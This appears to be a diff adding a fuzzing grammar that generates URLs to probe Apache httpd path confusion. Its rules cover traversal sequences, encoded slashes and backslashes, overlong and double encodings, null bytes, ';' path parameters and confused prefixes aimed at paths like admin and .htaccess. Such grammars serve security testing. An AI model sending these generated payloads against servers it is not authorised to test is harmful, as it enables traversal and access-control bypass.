@@ -1,0 +1,148 @@
+# =============================================================================
+# Apache Confusion URL Grammar — path confusion, encoding tricks, traversal
+#
+# Generates URLs targeting module interaction confusion in Apache httpd:
+# - mod_rewrite / mod_proxy filename confusion
+# - Location vs Directory scope mismatch
+# - Path parameter confusion (;param)
+# - Encoding confusion (%2f, %5c, double-encode)
+# - Handler confusion via extension
+# =============================================================================
+
+!root <request_url>
+!max_depth 5
+
+# =============================================================================
+# Top-level URL structure
+# =============================================================================
+<request_url> = /<path_segments>
+<request_url> = /<path_segments>?<query>
+<request_url> = /<path_segments>;<path_params>
+<request_url> = /<confused_prefix><path_segments>
+
+# =============================================================================
+# Path segments — normal and confused
+# =============================================================================
+<path_segments> = <segment>
+<path_segments> = <segment>/<path_segments>
+
+<segment> = <normal_dir>
+<segment> = <normal_file>
+<segment> = <confused_segment>
+
+# =============================================================================
+# Normal directories and files
+# =============================================================================
+<normal_dir> = admin
+<normal_dir> = internal
+<normal_dir> = public
+<normal_dir> = cgi-bin
+<normal_dir> = api
+<normal_dir> = app
+<normal_dir> = proxy
+<normal_dir> = static
+<normal_dir> = view
+<normal_dir> = cgi
+
+<normal_file> = index.html
+<normal_file> = secret.html
+<normal_file> = config.html
+<normal_file> = test.cgi
+<normal_file> = .htaccess
+<normal_file> = <string min=1 max=8 charset=lower>.<extension>
+
+<extension> = html
+<extension> = php
+<extension> = cgi
+<extension> = jsp
+<extension> = py
+<extension> = pl
+<extension> = txt
+
+# =============================================================================
+# Confused segments — Orange Tsai patterns
+# =============================================================================
+<confused_segment> = <traversal><slash><segment>
+<confused_segment> = <segment><path_param_sep><param_value>
+<confused_segment> = <segment><null_byte><extension>
+<confused_segment> = <encoding_trick><segment>
+<confused_segment> = <segment><slash><traversal>
+<confused_segment> = <segment><slash><segment><slash><traversal>
+
+# =============================================================================
+# Traversal patterns
+# =============================================================================
+<traversal> = ..
+<traversal> = %2e%2e
+<traversal> = %2e.
+<traversal> = .%2e
+<traversal> = %252e%252e
+<traversal> = ..%00
+<traversal> = %c0%ae%c0%ae
+<traversal> = %%32%65%%32%65
+
+# =============================================================================
+# Path separators (confusion between / and \)
+# =============================================================================
+<slash> = /
+<slash> = %2f
+<slash> = %5c
+<slash> = \
+<slash> = %252f
+<slash> = %255c
+
+# =============================================================================
+# Confused prefixes (before first segment)
+# =============================================================================
+<confused_prefix> = /
+<confused_prefix> = //
+<confused_prefix> = /./
+<confused_prefix> = /../
+<confused_prefix> = ;/
+<confused_prefix> = %2f
+<confused_prefix> = ..;/
+
+# =============================================================================
+# Path parameter confusion (Tomcat/WebLogic ;param vs Apache path)
+# =============================================================================
+<path_param_sep> = ;
+<path_param_sep> = %3b
+<path_param_sep> = %3B
+
+<path_params> = jsessionid=<hex_val>
+<path_params> = <param_name>=<param_value>
+<path_params> = <param_name>=<param_value>;<path_params>
+
+<param_name> = a
+<param_name> = path
+<param_name> = file
+<param_name> = jsessionid
+<param_name> = <string min=1 max=4 charset=lower>
+
+<param_value> = <string min=1 max=8 charset=alphanumeric>
+
+<hex_val> = <string min=8 max=32 charset=hex>
+
+# =============================================================================
+# Encoding tricks
+# =============================================================================
+<encoding_trick> = %2f
+<encoding_trick> = %252f
+<encoding_trick> = %2e
+<encoding_trick> = %00
+<encoding_trick> = %0a
+<encoding_trick> = %0d
+<encoding_trick> = %20
+<encoding_trick> = %09
+
+# =============================================================================
+# Null byte patterns
+# =============================================================================
+<null_byte> = %00
+<null_byte> = %00.
+
+# =============================================================================
+# Query string
+# =============================================================================
+<query> = <param_name>=<param_value>
+<query> = <param_name>=<param_value>&<query>
